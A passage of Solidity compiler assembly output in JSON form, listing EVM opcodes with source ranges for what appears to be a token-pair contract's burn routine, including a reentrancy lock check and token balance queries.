											"end": 861,
											"name": "DUP2"
										},
										{
											"begin": 820,
											"end": 861,
											"name": "JUMP",
											"value": "[out]"
										},
										{
											"begin": 7789,
											"end": 9218,
											"name": "tag",
											"value": "94"
										},
										{
											"begin": 7789,
											"end": 9218,
											"name": "JUMPDEST"
										},
										{
											"begin": 7852,
											"end": 7864,
											"name": "PUSH",
											"value": "0"
										},
										{
											"begin": 7866,
											"end": 7878,
											"name": "DUP1"
										},
										{
											"begin": 1292,
											"end": 1300,
											"name": "PUSH",
											"value": "F"
										},
										{
											"begin": 1292,
											"end": 1300,
											"name": "SLOAD"
										},
										{
											"begin": 1304,
											"end": 1305,
											"name": "PUSH",
											"value": "1"
										},
										{
											"begin": 1292,
											"end": 1305,
											"name": "EQ"
										},
										{
											"begin": 1284,
											"end": 1325,
											"name": "PUSH [tag]",
											"value": "225"
										},
										{
											"begin": 1284,
											"end": 1325,
											"name": "JUMPI"
										},
										{
											"begin": 1284,
											"end": 1325,
											"name": "PUSH",
											"value": "40"
										},
										{
											"begin": 1284,
											"end": 1325,
											"name": "DUP1"
										},
										{
											"begin": 1284,
											"end": 1325,
											"name": "MLOAD"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"value": "461BCD"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"value": "E5"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "SHL"
										},
										{
											"begin": 1284,
											"end": 1325,
											"name": "DUP2"
										},
										{
											"begin": 1284,
											"end": 1325,
											"name": "MSTORE"
										},
										{
											"begin": 1284,
											"end": 1325,
											"name": "PUSH",
											"value": "20"
										},
										{
											"begin": 1284,
											"end": 1325,
											"name": "PUSH",
											"value": "4"
										},
										{
											"begin": 1284,
											"end": 1325,
											"name": "DUP3"
										},
										{
											"begin": 1284,
											"end": 1325,
											"name": "ADD"
										},
										{
											"begin": 1284,
											"end": 1325,
											"name": "MSTORE"
										},
										{
											"begin": 1284,
											"end": 1325,
											"name": "PUSH",
											"value": "F"
										},
										{
											"begin": 1284,
											"end": 1325,
											"name": "PUSH",
											"value": "24"
										},
										{
											"begin": 1284,
											"end": 1325,
											"name": "DUP3"
										},
										{
											"begin": 1284,
											"end": 1325,
											"name": "ADD"
										},
										{
											"begin": 1284,
											"end": 1325,
											"name": "MSTORE"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"value": "14185B98D85AD94E881313D0D2D151"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"value": "8A"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "SHL"
										},
										{
											"begin": 1284,
											"end": 1325,
											"name": "PUSH",
											"value": "44"
										},
										{
											"begin": 1284,
											"end": 1325,
											"name": "DUP3"
										},
										{
											"begin": 1284,
											"end": 1325,
											"name": "ADD"
										},
										{
											"begin": 1284,
											"end": 1325,
											"name": "MSTORE"
										},
										{
											"begin": 1284,
											"end": 1325,
											"name": "SWAP1"
										},
										{
											"begin": 1284,
											"end": 1325,
											"name": "MLOAD"
										},
										{
											"begin": 1284,
											"end": 1325,
											"name": "SWAP1"
										},
										{
											"begin": 1284,
											"end": 1325,
											"name": "DUP2"
										},
										{
											"begin": 1284,
											"end": 1325,
											"name": "SWAP1"
										},
										{
											"begin": 1284,
											"end": 1325,
											"name": "SUB"
										},
										{
											"begin": 1284,
											"end": 1325,
											"name": "PUSH",
											"value": "64"
										},
										{
											"begin": 1284,
											"end": 1325,
											"name": "ADD"
										},
										{
											"begin": 1284,
											"end": 1325,
											"name": "SWAP1"
										},
										{
											"begin": 1284,
											"end": 1325,
											"name": "REVERT"
										},
										{
											"begin": 1284,
											"end": 1325,
											"name": "tag",
											"value": "225"
										},
										{
											"begin": 1284,
											"end": 1325,
											"name": "JUMPDEST"
										},
										{
											"begin": 1346,
											"end": 1347,
											"name": "PUSH",
											"value": "0"
										},
										{
											"begin": 1335,
											"end": 1343,
											"name": "PUSH",
											"value": "F"
										},
										{
											"begin": 1335,
											"end": 1347,
											"name": "DUP2"
										},
										{
											"begin": 1335,
											"end": 1347,
											"name": "SWAP1"
										},
										{
											"begin": 1335,
											"end": 1347,
											"name": "SSTORE"
										},
										{
											"begin": 1346,
											"end": 1347,
											"name": "DUP1"
										},
										{
											"begin": 7933,
											"end": 7946,
											"name": "PUSH [tag]",
											"value": "227"
										},
										{
											"begin": 7933,
											"end": 7944,
											"name": "PUSH [tag]",
											"value": "54"
										},
										{
											"begin": 7933,
											"end": 7946,
											"name": "JUMP",
											"value": "[in]"
										},
										{
											"begin": 7933,
											"end": 7946,
											"name": "tag",
											"value": "227"
										},
										{
											"begin": 7933,
											"end": 7946,
											"name": "JUMPDEST"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "POP"
										},
										{
											"begin": 7989,
											"end": 7995,
											"name": "PUSH",
											"value": "8"
										},
										{
											"begin": 7989,
											"end": 7995,
											"name": "SLOAD"
										},
										{
											"begin": 8038,
											"end": 8044,
											"name": "PUSH",
											"value": "9"
										},
										{
											"begin": 8038,
											"end": 8044,
											"name": "SLOAD"
										},
										{
											"begin": 8085,
											"end": 8125,
											"name": "PUSH",
											"value": "40"
										},
										{
											"begin": 8085,
											"end": 8125,
											"name": "DUP1"
										},
										{
											"begin": 8085,
											"end": 8125,
											"name": "MLOAD"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"value": "70A08231"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"value": "E0"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "SHL"
										},
										{
											"begin": 8085,
											"end": 8125,
											"name": "DUP2"
										},
										{
											"begin": 8085,
											"end": 8125,
											"name": "MSTORE"
										},
										{
											"begin": 8119,
											"end": 8123,
											"name": "ADDRESS"
										},
										{
											"begin": 8085,
											"end": 8125,
											"name": "PUSH",
											"value": "4"
										},
										{
											"begin": 8085,
											"end": 8125,
											"name": "DUP3"
										},
										{
											"begin": 8085,
											"end": 8125,
											"name": "ADD"
										},
										{
											"begin": 8085,
											"end": 8125,
											"name": "MSTORE"
										},
										{
											"begin": 8085,
											"end": 8125,
											"name": "SWAP1"
										},
										{
											"begin": 8085,
											"end": 8125,
											"name": "MLOAD"
										},
										{
											"begin": 7890,
											"end": 7946,
											"name": "SWAP5"
										},
										{
											"begin": 7890,
											"end": 7946,
											"name": "SWAP7"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "POP"
										},
										{
											"begin": 7890,
											"end": 7946,
											"name": "SWAP3"
										},
										{
											"begin": 7890,
											"end": 7946,
											"name": "SWAP5"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "POP"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"value": "1"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"value": "1"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"value": "A0"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "SHL"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "SUB"
										},
										{
											"begin": 7989,
											"end": 7995,
											"name": "SWAP2"
										},
										{
											"begin": 7989,
											"end": 7995,
											"name": "DUP3"
										},
										{
											"begin": 7989,
											"end": 7995,
											"name": "AND"
										},
										{
											"begin": 7989,
											"end": 7995,
											"name": "SWAP4"
										},
										{
											"begin": 8038,
											"end": 8044,
											"name": "SWAP2"
										},
										{
											"begin": 8038,
											"end": 8044,
											"name": "AND"
										},
										{
											"begin": 8038,
											"end": 8044,
											"name": "SWAP2"
										},
										{
											"begin": 7971,
											"end": 7986,
											"name": "PUSH",
											"value": "0"
										},
										{
											"begin": 7971,
											"end": 7986,
											"name": "SWAP2"
										},
										{
											"begin": 7989,
											"end": 7995,
											"name": "DUP5"
										},
										{
											"begin": 7989,
											"end": 7995,
											"name": "SWAP2"
										},
										{
											"begin": 8085,
											"end": 8110,
											"name": "PUSH",
											"value": "70A08231"
										},
										{
											"begin": 8085,
											"end": 8110,
											"name": "SWAP2"
										},
										{
											"begin": 8085,
											"end": 8125,
											"name": "PUSH",
											"value": "24"
										},
										{
											"begin": 8085,
											"end": 8125,
											"name": "DUP1"
										},
										{
											"begin": 8085,
											"end": 8125,
											"name": "DUP4"
										},
										{
											"begin": 8085,
											"end": 8125,
											"name": "ADD"
										},
										{
											"begin": 8085,
											"end": 8125,
											"name": "SWAP3"
										},
										{
											"begin": 8085,
											"end": 8125,
											"name": "PUSH",
											"value": "20"
										},
										{
											"begin": 8085,
											"end": 8125,
											"name": "SWAP3"
										},
										{
											"begin": 8085,
											"end": 8125,
											"name": "SWAP2"
										},
										{
											"begin": 8085,
											"end": 8125,
											"name": "SWAP1"
										},
										{
											"begin": 8085,
											"end": 8125,
											"name": "DUP3"
										},
										{
											"begin": 8085,
											"end": 8125,
											"name": "SWAP1"
										},
										{
											"begin": 8085,
											"end": 8125,
											"name": "SUB"
										},
										{
											"begin": 8085,
											"end": 8125,
											"name": "ADD"
										},
										{
											"begin": 8085,
											"end": 8125,
											"name": "DUP2"
										},
										{
											"begin": 7989,
											"end": 7995,
											"name": "DUP7"
										},
										{
											"begin": 8085,
											"end": 8125,
											"name": "DUP1"
										},
										{
											"begin": 8085,
											"end": 8125,
											"name": "EXTCODESIZE"
										},
										{
											"begin": 8085,
											"end": 8125,
											"name": "ISZERO"
										},
										{
											"begin": 5,
											"end": 7,
											"name": "DUP1"
										},
										{
											"begin": 5,
											"end": 7,
											"name": "ISZERO"
										},
										{
											"begin": 5,
											"end": 7,
											"name": "PUSH [tag]",
											"value": "228"
										},
										{
											"begin": 5,
											"end": 7,
											"name": "JUMPI"
										},
										{
											"begin": 30,
											"end": 31,
											"name": "PUSH",
											"value": "0"
										},
										{
											"begin": 27,
											"end": 28,
											"name": "DUP1"
										},
										{
											"begin": 20,
											"end": 32,
											"name": "REVERT"
										},
										{
											"begin": 5,
											"end": 7,
											"name": "tag",
											"value": "228"
										},
										{
											"begin": 5,
											"end": 7,
											"name": "JUMPDEST"
										},
										{
											"begin": 8085,
											"end": 8125,
											"name": "POP"
										},
										{
											"begin": 8085,
											"end": 8125,
											"name": "GAS"
										},
										{
											"begin": 8085,
											"end": 8125,
											"name": "STATICCALL"
										},
										{
											"begin": 8085,
											"end": 8125,
											"name": "ISZERO"
										},
										{
											"begin": 8,
											"end": 17,
											"name": "DUP1"
										},
										{
											"begin": 5,
											"end": 7,
											"name": "ISZERO"
										},
										{
											"begin": 5,
											"end": 7,
											"name": "PUSH [tag]",
											"value": "229"
										},
										{
											"begin": 5,
											"end": 7,
											"name": "JUMPI"
										},
										{
											"begin": 45,
											"end": 61,
											"name": "RETURNDATASIZE"
										},
										{
											"begin": 42,
											"end": 43,
											"name": "PUSH",
											"value": "0"
										},
										{
											"begin": 39,
											"end": 40,
											"name": "DUP1"
										},
										{
											"begin": 24,
											"end": 62,
											"name": "RETURNDATACOPY"
										},
										{
											"begin": 77,
											"end": 93,
											"name": "RETURNDATASIZE"
										},
										{
											"begin": 74,
											"end": 75,
											"name": "PUSH",
											"value": "0"
										},
										{
											"begin": 67,
											"end": 94,
											"name": "REVERT"
										},
										{
											"begin": 5,
											"end": 7,
											"name": "tag",
											"value": "229"
										},
										{
											"begin": 5,
											"end": 7,
											"name": "JUMPDEST"
										},
										{
											"begin": 8085,
											"end": 8125,
											"name": "POP"
										},
										{
											"begin": 8085,
											"end": 8125,
											"name": "POP"
										},
										{
											"begin": 8085,
											"end": 8125,
											"name": "POP"
										},
										{
											"begin": 8085,
											"end": 8125,
											"name": "POP"
										},
										{
											"begin": 8085,
											"end": 8125,
											"name": "PUSH",
											"value": "40"
										},
										{
											"begin": 8085,
											"end": 8125,
											"name": "MLOAD"
										},
										{
											"begin": 8085,
											"end": 8125,
											"name": "RETURNDATASIZE"
										},
										{
											"begin": 13,
											"end": 15,
											"name": "PUSH",
											"value": "20"
										},
										{
											"begin": 8,
											"end": 11,
											"name": "DUP2"
										},
										{
											"begin": 5,
											"end": 16,
											"name": "LT"
										},
										{
											"begin": 2,
											"end": 4,
											"name": "ISZERO"
										},
										{
											"begin": 2,
											"end": 4,
											"name": "PUSH [tag]",
											"value": "230"
										},
										{
											"begin": 2,
											"end": 4,
											"name": "JUMPI"
										},
										{
											"begin": 29,
											"end": 30,
											"name": "PUSH",
											"value": "0"
										},
										{
											"begin": 26,
											"end": 27,
											"name": "DUP1"
										},
										{
											"begin": 19,
											"end": 31,
											"name": "REVERT"
										},
										{
											"begin": 2,
											"end": 4,
											"name": "tag",
											"value": "230"
										},
										{
											"begin": 2,
											"end": 4,
											"name": "JUMPDEST"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "POP"
										},
										{
											"begin": 8085,
											"end": 8125,
											"name": "MLOAD"
										},
										{
											"begin": 8151,
											"end": 8191,
											"name": "PUSH",
											"value": "40"
										},
										{
											"begin": 8151,
											"end": 8191,
											"name": "DUP1"
										},
										{
											"begin": 8151,
											"end": 8191,
											"name": "MLOAD"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"value": "70A08231"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"value": "E0"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "SHL"
										},
										{
											"begin": 8151,
											"end": 8191,
											"name": "DUP2"
										},
										{
											"begin": 8151,
											"end": 8191,
											"name": "MSTORE"
										},
										{
											"begin": 8185,
											"end": 8189,
											"name": "ADDRESS"
										},
										{
											"begin": 8151,
											"end": 8191,
											"name": "PUSH",
											"value": "4"
										},
										{
											"begin": 8151,
											"end": 8191,
											"name": "DUP3"
										},
										{
											"begin": 8151,
											"end": 8191,
											"name": "ADD"
										},
										{
											"begin": 8151,
											"end": 8191,
											"name": "MSTORE"
										},
										{
											"begin": 8151,
											"end": 8191,
											"name": "SWAP1"
										},
										{
											"begin": 8151,
											"end": 8191,
											"name": "MLOAD"
										},
										{
											"begin": 8085,
											"end": 8125,
											"name": "SWAP2"
										},
										{
											"begin": 8085,
											"end": 8125,
											"name": "SWAP3"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "POP"
										},
										{
											"begin": 8135,
											"end": 8148,
											"name": "PUSH",
											"value": "0"
										},
										{
											"begin": 8135,
											"end": 8148,
											"name": "SWAP2"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"value": "1"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"value": "1"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"value": "A0"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "SHL"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "SUB"
										},
										{
											"begin": 8151,
											"end": 8176,
											"name": "DUP6"
										},
										{
											"begin": 8151,
											"end": 8176,
											"name": "AND"
										},
										{
											"begin": 8151,
											"end": 8176,
											"name": "SWAP2"
										},
										{
											"begin": 8151,
											"end": 8176,
											"name": "PUSH",
											"value": "70A08231"
										},
										{
											"begin": 8151,
											"end": 8176,
											"name": "SWAP2"
										},
										{
											"begin": 8151,
											"end": 8191,
											"name": "PUSH",
											"value": "24"
										},
										{
											"begin": 8151,
											"end": 8191,
											"name": "DUP1"
										},
										{
											"begin": 8151,
											"end": 8191,
											"name": "DUP4"
										},
										{
											"begin": 8151,
											"end": 8191,
											"name": "ADD"
										},
										{
											"begin": 8151,
											"end": 8191,
											"name": "SWAP3"
										},
										{
											"begin": 8085,
											"end": 8125,
											"name": "PUSH",
											"value": "20"
										},
										{
											"begin": 8085,
											"end": 8125,
											"name": "SWAP3"
										},
										{
											"begin": 8151,
											"end": 8191,
											"name": "SWAP2"
										},
										{
											"begin": 8151,
											"end": 8191,
											"name": "SWAP1"
										},
										{
											"begin": 8151,
											"end": 8191,
											"name": "DUP3"
										},
										{
											"begin": 8151,
											"end": 8191,
											"name": "SWAP1"
										},
										{
											"begin": 8151,
											"end": 8191,
											"name": "SUB"
										},
										{
											"begin": 8151,
											"end": 8191,
											"name": "ADD"
										},
										{
											"begin": 8151,
											"end": 8191,
											"name": "DUP2"
										},
										{
											"begin": 8151,
											"end": 8176,
											"name": "DUP7"
										},
										{
											"begin": 8151,
											"end": 8191,
											"name": "DUP1"
										},
										{
											"begin": 8151,
											"end": 8191,
											"name": "EXTCODESIZE"
										},
										{
											"begin": 8151,
											"end": 8191,
											"name": "ISZERO"
										},
										{
											"begin": 5,
											"end": 7,
											"name": "DUP1"
										},
										{
											"begin": 5,
											"end": 7,
											"name": "ISZERO"
										},
										{
											"begin": 5,
											"end": 7,
											"name": "PUSH [tag]",
											"value": "231"
										},
										{
											"begin": 5,
											"end": 7,
											"name": "JUMPI"
										},
										{
											"begin": 30,
											"end": 31,
											"name": "PUSH",
											"value": "0"
										},
										{
											"begin": 27,
											"end": 28,
											"name": "DUP1"
										},
										{
											"begin": 20,
											"end": 32,
											"name": "REVERT"
										},
										{
											"begin": 5,
											"end": 7,
											"name": "tag",
											"value": "231"
										},
										{
											"begin": 5,
											"end": 7,
											"name": "JUMPDEST"
										},
										{
											"begin": 8151,
											"end": 8191,
											"name": "POP"
										},
										{
											"begin": 8151,
											"end": 8191,
											"name": "GAS"
										},
										{
											"begin": 8151,
											"end": 8191,
											"name": "STATICCALL"
										},
										{
											"begin": 8151,
											"end": 8191,
											"name": "ISZERO"
										},
										{
											"begin": 8,
											"end": 17,
											"name": "DUP1"
										},
										{
											"begin": 5,
											"end": 7,
											"name": "ISZERO"
										},
										{
											"begin": 5,
											"end": 7,
											"name": "PUSH [tag]",
											"value": "232"
										},
										{
											"begin": 5,
											"end": 7,
											"name": "JUMPI"
										},
										{
											"begin": 45,
											"end": 61,
											"name": "RETURNDATASIZE"
										},
										{
											"begin": 42,
											"end": 43,
											"name": "PUSH",
											"value": "0"
										},
										{
											"begin": 39,
											"end": 40,
											"name": "DUP1"
										},
										{
											"begin": 24,
											"end": 62,
											"name": "RETURNDATACOPY"
										},
										{
											"begin": 77,
											"end": 93,
											"name": "RETURNDATASIZE"
										},
										{
											"begin": 74,
											"end": 75,
											"name": "PUSH",
											"value": "0"
										},
										{
											"begin": 67,
											"end": 94,
											"name": "REVERT"
										},
										{
											"begin": 5,
											"end": 7,
											"name": "tag",
											"value": "232"
										},
										{
											"begin": 5,
											"end": 7,
											"name": "JUMPDEST"
										},
										{
											"begin": 8151,
											"end": 8191,
											"name": "POP"
										},
										{
											"begin": 8151,
											"end": 8191,
											"name": "POP"
										},
										{
											"begin": 8151,
											"end": 8191,
											"name": "POP"
										},
										{
											"begin": 8151,
											"end": 8191,
											"name": "POP"
										},
										{
											"begin": 8151,
											"end": 8191,
											"name": "PUSH",
											"value": "40"
										},
										{
											"begin": 8151,
											"end": 8191,
											"name": "MLOAD"
										},
										{
											"begin": 8151,
											"end": 8191,
											"name": "RETURNDATASIZE"
										},
										{
											"begin": 13,
											"end": 15,
											"name": "PUSH",
											"value": "20"
										},
										{
											"begin": 8,
											"end": 11,
											"name": "DUP2"
										},
										{
											"begin": 5,
											"end": 16,
											"name": "LT"
										},
										{
											"begin": 2,
											"end": 4,
											"name": "ISZERO"
										},
										{
											"begin": 2,
											"end": 4,
											"name": "PUSH [tag]",
											"value": "233"
										},
										{
											"begin": 2,
											"end": 4,
											"name": "JUMPI"
										},
										{
											"begin": 29,
											"end": 30,
											"name": "PUSH",
											"value": "0"
										},
										{
											"begin": 26,
											"end": 27,
											"name": "DUP1"
										},
										{
											"begin": 19,
											"end": 31,
											"name": "REVERT"
										},
										{
											"begin": 2,
											"end": 4,
											"name": "tag",
											"value": "233"
										},
										{
											"begin": 2,
											"end": 4,
											"name": "JUMPDEST"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "POP"
										},
										{
											"begin": 8151,
											"end": 8191,
											"name": "MLOAD"
										},
										{
											"begin": 8236,
											"end": 8240,
											"name": "ADDRESS"
										},
										{
											"begin": 8201,
											"end": 8215,
											"name": "PUSH",
											"value": "0"
										},
										{
											"begin": 8218,
											"end": 8242,
											"name": "SWAP1"
										},
										{
											"begin": 8218,
											"end": 8242,
											"name": "DUP2"
										},
										{
											"begin": 8218,
											"end": 8242,
											"name": "MSTORE"
										},
										{
											"begin": 8218,
											"end": 8227,
											"name": "PUSH",
											"value": "1"
										},
										{
											"begin": 8151,
											"end": 8191,
											"name": "PUSH",
											"value": "20"
										},
										{
											"begin": 8218,
											"end": 8242,
											"name": "MSTORE"
										},
										{
											"begin": 8218,
											"end": 8242,
											"name": "PUSH",
											"value": "40"
										},
										{
											"begin": 8218,
											"end": 8242,
											"name": "DUP2"
										},
										{
											"begin": 8218,
											"end": 8242,
											"name": "KECCAK256"
										},
										{
											"begin": 8218,
											"end": 8242,
											"name": "SLOAD"
										},
										{
											"begin": 8151,
											"end": 8191,
											"name": "SWAP2"
										},
										{
											"begin": 8151,
											"end": 8191,
											"name": "SWAP3"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "POP"
										},
										{
											"begin": 8266,
											"end": 8296,
											"name": "PUSH [tag]",
											"value": "234"
										},
										{
											"begin": 8275,
											"end": 8284,
											"name": "DUP9"
										},
										{
											"begin": 8286,
											"end": 8295,
											"name": "DUP9"
										},
										{
											"begin": 8266,
											"end": 8274,
											"name": "PUSH [tag]",
											"value": "204"
										},
										{
											"begin": 8266,
											"end": 8296,
											"name": "JUMP",
											"value": "[in]"
										},
										{
											"begin": 8266,
											"end": 8296,
											"name": "tag",
											"value": "234"
										},
										{
											"begin": 8266,
											"end": 8296,
											"name": "JUMPDEST"
										},
										{
											"begin": 8306,
											"end": 8323,
											"name": "PUSH",
											"value": "0"
										},
										{
											"begin": 8326,
											"end": 8337,
											"name": "SLOAD"
										},
										{
											"begin": 8253,
											"end": 8296,
											"name": "SWAP1"
										},
										{
											"begin": 8253,
											"end": 8296,
											"name": "SWAP2"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "POP"
										},
										{
											"begin": 8326,
											"end": 8337,
											"name": "DUP1"
										},
										{
											"begin": 8435,
											"end": 8458,
											"name": "PUSH [tag]",
											"value": "235"
										},
										{
											"begin": 8435,
											"end": 8444,
											"name": "DUP5"
										},
										{
											"begin": 8449,
											"end": 8457,
											"name": "DUP8"
										},
										{
											"begin": 8435,
											"end": 8458,
											"name": "PUSH",
											"value": "FFFFFFFF"
										},
										{
											"begin": 8435,
											"end": 8448,
											"name": "PUSH [tag]",
											"value": "168"
										},
										{
											"begin": 8435,
											"end": 8458,
											"name": "AND"
										},
										{
											"begin": 8435,
											"end": 8458,
											"name": "JUMP",
											"value": "[in]"
										},
										{
											"begin": 8435,
											"end": 8458,
											"name": "tag",
											"value": "235"
										},
										{
											"begin": 8435,
											"end": 8458,
											"name": "JUMPDEST"
										},
										{
											"begin": 8435,
											"end": 8473,
											"name": "DUP2"
										},
										{
											"begin": 8435,
											"end": 8473,
											"name": "PUSH [tag]",
											"value": "236"
										},
										{
											"begin": 8435,
											"end": 8473,
											"name": "JUMPI"
										},
										{
											"begin": 8435,
											"end": 8473,
											"name": "INVALID"
										},
										{
											"begin": 8435,
											"end": 8473,
											"name": "tag",
											"value": "236"
										},
										{
											"begin": 8435,
											"end": 8473,
											"name": "JUMPDEST"
										},
										{
											"begin": 8435,
											"end": 8473,
											"name": "DIV"
										},
										{
											"begin": 8435,
											"end": 8473,
											"name": "SWAP11"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "POP"
										},
										{
											"begin": 8567,
											"end": 8579,
											"name": "DUP1"
										},
										{
											"begin": 8541,
											"end": 8564,
											"name": "PUSH [tag]",
											"value": "237"
										},
										{
											"begin": 8541,
											"end": 8550,
											"name": "DUP5"
										},
										{
											"begin": 8555,
											"end": 8563,
											"name": "DUP7"
										},
										{
											"begin": 8541,
											"end": 8564,
											"name": "PUSH",
											"value": "FFFFFFFF"
										},
										{
											"begin": 8541,
											"end": 8554,
											"name": "PUSH [tag]",
											"value": "168"
										},
										{
											"begin": 8541,
											"end": 8564,
											"name": "AND"
										},
										{
											"begin": 8541,
											"end": 8564,
											"name": "JUMP",
											"value": "[in]"
										},
										{
											"begin": 8541,
											"end": 8564,
											"name": "tag",
											"value": "237"
										},
										{
											"begin": 8541,
											"end": 8564,
											"name": "JUMPDEST"
										},
										{
											"begin": 8541,
											"end": 8579,
											"name": "DUP2"
										},
										{
											"begin": 8541,
											"end": 8579,
											"name": "PUSH [tag]",
											"value": "238"
										},
										{
											"begin": 8541,
											"end": 8579,
											"name": "JUMPI"
										},
										{
											"begin": 8541,
											"end": 8579,
											"name": "INVALID"
										},
										{
											"begin": 8541,
											"end": 8579,
											"name": "tag",
											"value": "238"
										},
										{
											"begin": 8541,
											"end": 8579,
											"name": "JUMPDEST"
										},
										{
											"begin": 8541,
											"end": 8579,
											"name": "DIV"
										},
										{
											"begin": 8531,
											"end": 8579,
											"name": "SWAP10"
										},
										{
											"begin": 8531,
											"end": 8579,
											"name": "POP"
										},
										{
											"begin": 8668,
											"end": 8669,
											"name": "PUSH",
											"value": "0"
										},
										{
											"begin": 8658,
											"end": 8665,
											"name": "DUP12"
										},
										{
											"begin": 8658,
											"end": 8669,
											"name": "GT"
										},
										{
											"begin": 8658,
											"end": 8684,
											"name": "DUP1"
										},
										{
											"begin": 8658,
											"end": 8684,
											"name": "ISZERO"
										},
										{
											"begin": 8658,
											"end": 8684,
											"name": "PUSH [tag]",
											"value": "239"
										},
										{
											"begin": 8658,
											"end": 8684,
											"name": "JUMPI"
										},
										{
											"begin": 8658,
											"end": 8684,
											"name": "POP"
										},
										{
											"begin": 8683,
											"end": 8684,
											"name": "PUSH",
											"value": "0"
										},
										{
											"begin": 8673,
											"end": 8680,
											"name": "DUP11"
										},
										{
											"begin": 8673,
											"end": 8684,
											"name": "GT"
										},
										{
											"begin": 8658,
											"end": 8684,
											"name": "tag",
											"value": "239"
										},
										{
											"begin": 8658,
											"end": 8684,
											"name": "JUMPDEST"
										},
										{
											"begin": 8637,
											"end": 8748,
											"name": "PUSH [tag]",
											"value": "240"
										},
										{
											"begin": 8637,
											"end": 8748,
											"name": "JUMPI"
										},
										{
											"begin": 8637,
											"end": 8748,
											"name": "PUSH",
											"value": "40"
										},
										{
											"begin": 8637,
											"end": 8748,
											"name": "MLOAD"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"value": "461BCD"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"value": "E5"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "SHL"
										},
										{
											"begin": 8637,
											"end": 8748,
											"name": "DUP2"
										},
										{
											"begin": 8637,
											"end": 8748,
											"name": "MSTORE"
										},
										{
											"begin": 8637,
											"end": 8748,
											"name": "PUSH",
											"value": "4"
										},
										{
											"begin": 8637,
											"end": 8748,
											"name": "ADD"
										},
										{
											"begin": 8637,
											"end": 8748,
											"name": "DUP1"
										},
										{
											"begin": 8637,
											"end": 8748,
											"name": "DUP1"
										},
										{
											"begin": 8637,
											"end": 8748,
											"name": "PUSH",
											"value": "20"
										},
										{
											"begin": 8637,
											"end": 8748,
											"name": "ADD"
										},
										{
											"begin": 8637,
											"end": 8748,
											"name": "DUP3"
										},
										{
											"begin": 8637,
											"end": 8748,
											"name": "DUP2"
										},
										{
											"begin": 8637,
											"end": 8748,
											"name": "SUB"
										},
										{
											"begin": 8637,
											"end": 8748,
											"name": "DUP3"
										},
										{
											"begin": 8637,
											"end": 8748,
											"name": "MSTORE"
										},
										{
											"begin": 8637,
											"end": 8748,
											"name": "PUSH",
											"value": "26"
										},
										{
											"begin": 8637,
											"end": 8748,
											"name": "DUP2"
										},
										{
											"begin": 8637,
											"end": 8748,
											"name": "MSTORE"
										},
										{
											"begin": 8637,
											"end": 8748,
											"name": "PUSH",
											"value": "20"
										},
										{
											"begin": 8637,
											"end": 8748,
											"name": "ADD"
										},
										{
											"begin": 8637,
											"end": 8748,
											"name": "DUP1"
										},
										{
											"begin": 8637,
											"end": 8748,
											"name": "PUSH data",
											"value": "6C050B0A8D3F2D18D11271EE0A551B7748437B8FA9A6165C561190D34A2947D6"
										},
										{
											"begin": 8637,
											"end": 8748,
											"name": "PUSH",
											"value": "26"
										},
										{
											"begin": 8637,
											"end": 8748,
											"name": "SWAP2"
										},
										{
											"begin": 8637,
											"end": 8748,
											"name": "CODECOPY"
										},
										{
											"begin": 8637,
											"end": 8748,
											"name": "PUSH",
											"value": "40"
										},
										{
											"begin": 8637,
											"end": 8748,
											"name": "ADD"
										},
										{
											"begin": 8637,
											"end": 8748,
											"name": "SWAP2"
										},
										{
											"begin": 8637,
											"end": 8748,
											"name": "POP"
										},
										{
											"begin": 8637,
											"end": 8748,
											"name": "POP"
										},
										{
											"begin": 8637,
											"end": 8748,
											"name": "PUSH",
											"value": "40"
										},
										{
											"begin": 8637,
											"end": 8748,
											"name": "MLOAD"
										},
										{
											"begin": 8637,
											"end": 8748,
											"name": "DUP1"
										},
										{
											"begin": 8637,
											"end": 8748,
											"name": "SWAP2"
										},
										{
											"begin": 8637,
											"end": 8748,
											"name": "SUB"
										},
										{
											"begin": 8637,
											"end": 8748,
											"name": "SWAP1"
										},
										{
											"begin": 8637,
											"end": 8748,
											"name": "REVERT"
										},
										{
											"begin": 8637,
											"end": 8748,
											"name": "tag",
											"value": "240"
										},
										{
											"begin": 8637,
											"end": 8748,
											"name": "JUMPDEST"
										},
										{
											"begin": 8758,
											"end": 8789,
											"name": "PUSH [tag]",
											"value": "241"
										},
										{
											"begin": 8772,
											"end": 8776,
											"name": "ADDRESS"
										},
										{
											"begin": 8779,
											"end": 8788,
											"name": "DUP5"
										},
										{
											"begin": 8758,
											"end": 8763,
											"name": "PUSH [tag]",
											"value": "242"
										},
										{
											"begin": 8758,
											"end": 8789,
											"name": "JUMP",
											"value": "[in]"
										},
										{
